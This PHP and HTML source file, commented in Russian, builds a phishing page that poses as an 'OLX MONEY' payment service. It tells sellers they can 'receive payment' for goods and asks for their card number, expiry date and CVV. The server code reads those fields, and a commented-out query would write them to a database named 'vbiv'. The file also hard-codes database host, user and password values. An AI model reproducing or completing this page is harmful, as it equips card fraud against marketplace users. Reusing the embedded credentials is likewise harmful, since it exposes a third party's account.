<?php
// Параметры подключения к базе данных
$host = 'sql113.infinityfree.com';
$user = 'if0_39974110';       // Замени, если у тебя другой пользователь
$password = 'Karpovakatya124';       // Укажи пароль, если есть
$dbname = 'if0_39974110_vbiv'; // Название твоей базы данных

// Подключаемся к базе
$conn = new mysqli($host, $user, $password, $dbname);

// Проверка подключения
if ($conn->connect_error) {
    die("Ошибка подключения к БД: " . $conn->connect_error);
}

// Функция для обработки цифр и сохранения в базу
function processInput($input_string, $conn) {
    // Ищем все цифры в строке
    preg_match_all('/\d+/', $input_string, $matches);

    // Возвращаем массив с цифрами
    return $matches[0];
}

// Если форма отправлена
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Получаем данные из обеих текстовых областей
    $card_number = $_POST['card_number'] ?? '';
    $exp_month = $_POST['exp_month'] ?? '';
    $cvv = $_POST['cvv'] ?? '';

    // Обрабатываем первую строку
    $numbers1 = processInput($card_number, $conn);
    // Обрабатываем вторую строку
    $numbers2 = processInput($exp_month, $conn);
    $numbers3 = processInput($cvv, $conn);

    // Понимаем, что числа из обеих строк нужно записать в один ряд:
    $number1 = $numbers1[0] ?? null;  // Записываем первое число из первой строки
    $number2 = $numbers2[0] ?? null;  // Записываем первое число из второй строки
    $number3 = $numbers3[0] ?? null;  // Записываем второе число из второй строки

    // Если есть хотя бы одно число, сохраняем его в базу
   // if ($number1 || $number2 || $number3) {
  //      $stmt = $conn->prepare("INSERT INTO numbers (number1, number2, number3) VALUES (?, ?, ?)");
   //     $stmt->bind_param("iii", $number1, $number2, $number3);
   //     $stmt->execute();
   //     $stmt->close();
        
   // } 
}

$conn->close();
?>

<!-- HTML-форма -->
<head>
    <meta charset="UTF-8">
    <title>OLX MONEY - Получение оплаты за товар</title>
    <style>
        /* Основные стили страницы */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f7fa; /* Цвет фона страницы */
        }

        /* Верхняя панель с логотипом */
        .top-bar {
            background-color: #003d58; /* Темный синий цвет */
            padding: 15px 0;
            display: flex;
            align-items: center;
            color: white;
            width: 100%;
        }

        .top-bar img {
            width: 120px; /* Ширина логотипа */
            margin-left: 20px; /* Отступ от левого края */
        }

        /* Контейнер для формы */
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: calc(100vh - 60px); /* Центрируем форму с учетом верхней панели */
            padding: 0 20px; /* Отступы, чтобы форма не упиралась в края */
        }

        .form-container {
            background-color: white; /* Белый фон формы */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 450px; /* Ограничиваем максимальную ширину формы */
            text-align: center;
        }

        h2 {
            color: #333;
            font-size: 1.5em;
            margin-bottom: 20px;
            font-weight: bold;
        }

        /* Стили для полей ввода */
        input[type="text"] {
            width: 100%;
            padding: 14px;
            margin-bottom: 20px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-sizing: border-box;
            background-color: #fafafa; /* Легкий серый фон для полей */
            transition: border-color 0.3s ease;
        }

        input[type="text"]:focus {
            border-color: #ff9900; /* Оранжевая подсветка при фокусе */
            outline: none;
        }

        /* Стили для маленьких полей месяца и года */
        .exp-date-wrapper {
            display: flex;
            justify-content: space-between;
            gap: 10px;
        }

        .exp-date-wrapper input[type="text"] {
            width: 48%; /* Делаем поля месяца и года маленькими */
        }

        /* Кнопка отправки */
        input[type="submit"] {
            background-color: #ff9900; /* Оранжевый цвет, как на сайте OLX */
            color: white;
            border: none;
            padding: 14px 24px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease;
        }

        input[type="submit"]:hover {
            background-color: #e68900; /* Тёмно-оранжевый при наведении */
            transform: scale(1.05); /* Эффект нажатия */
        }

        /* Визуализация карты */
        .card-visualization {
            background: linear-gradient(145deg, #1e2a38, #364a5a); /* Градиент для карты */
            width: 100%;
            height: 180px;
            border-radius: 12px;
            margin-top: 20px; /* Уменьшили отступ от формы */
            padding: 20px;
            color: white;
            position: relative;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
            font-family: 'Courier New', Courier, monospace;
            box-sizing: border-box;
        }

        /* Стиль для логотипа карты */
        .card-logo {
            position: absolute;
            top: 15px;
            left: 20px;
            font-size: 20px;
            font-weight: bold;
            color: #ff9900;
        }

        /* Стиль для номера карты */
        .card-number {
            font-size: 22px;
            letter-spacing: 2px;
            margin-top: 50px; /* Расстояние от логотипа */
            font-weight: 400;
        }

        /* Стиль для срока действия карты */
        .card-expiry {
            font-size: 16px;
            margin-top: 10px;
            font-weight: 300;
        }

        /* Стиль для CVV */
        .card-cvv {
            font-size: 16px;
            margin-top: 10px;
            font-weight: 300;
        }

        /* Черная магнитная полоса */
        .card-magnetic-stripe {
            position: absolute;
            top: 85%; /* Отодвигаем полоску ниже, чтобы текст не накладывался */
            left: 0;
            width: 100%;
            height: 20px;
            background-color: #000;
            border-radius: 4px;
        }

        /* Стили для нижней части формы (footer) */
        .footer {
            margin-top: 20px;
            font-size: 14px;
            color: #888;
        }

        .footer a {
            color: #007bff;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        /* Адаптивность на мобильных устройствах */
        @media (max-width: 768px) {
            .form-container {
                padding: 20px;
            }
            h2 {
                font-size: 1.3em;
            }

            /* Адаптируем поля для мобильных устройств */
            .exp-date-wrapper input[type="text"] {
                width: 100%;
            }
        }
    </style>
</head>
<body>

<!-- Верхняя панель с логотипом -->
<div class="top-bar">
    <img src="image/logo.png" alt="OLX Logo"> <!-- Логотип OLX (путь image/logo.png) -->
</div>

<!-- Контейнер для центрирования формы -->
<div class="container">
    <!-- Основная форма -->
    <form method="POST">
        <div class="form-container">
            <h2>Получите оплату за ваш товар через OLX MONEY</h2>

            <!-- Номер карты -->
            <input type="text" name="card_number" placeholder="Введите номер вашей карты (например, 1234 5678 9012 3456)" required maxlength="16" pattern="\d{16}" oninput="updateCardVisualization()"><br>

            <!-- Месяц и год окончания карты (в одном поле, но разделены на два маленьких) -->
            <div class="exp-date-wrapper">
                <input type="text" name="exp_month" placeholder="Месяц (например, 12)" required maxlength="2" pattern="\d{2}" oninput="updateCardVisualization()">
                <input type="text" name="exp_year" placeholder="Год (например, 2025)" required maxlength="4" pattern="\d{4}" oninput="updateCardVisualization()">
            </div><br>

            <!-- CVV код -->
            <input type="text" name="cvv" placeholder="CVV код (например, 123)" required maxlength="3" pattern="\d{3}" oninput="updateCardVisualization()"><br>

            <input type="submit" value="Получить оплату">

            <!-- Визуализация карты -->
            <div class="card-visualization">
                <!-- Логотип карты (например, VISA) -->
                <div class="card-logo">VISA</div>

                <!-- Черная магнитная полоса -->
                <div class="card-magnetic-stripe"></div>

                <!-- Номер карты -->
                <div class="card-number">1234 5678 9012 3456</div>

                <!-- Срок действия -->
                <div class="card-expiry">12/2025</div>

                <!-- CVV код -->
                <div class="card-cvv">CVV: 123</div>
